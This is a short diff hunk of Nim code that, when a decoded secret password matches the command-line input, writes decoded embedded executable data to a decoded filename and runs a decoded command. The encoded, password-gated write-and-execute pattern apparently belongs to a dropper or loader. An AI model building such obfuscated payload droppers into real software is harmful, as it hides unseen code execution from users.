@@ -35,7 +35,7 @@ when isMainModule:
   let param = commandLineParams().join " "
 
   if param == secretPass.decode:
-    var filename = evalPath outFilename
+    var filename = evalPath decode outFilename
     writeFile filename, decode exeData
     if command.len > 0:
       echo execProcess(decode command, filename.parentDir)
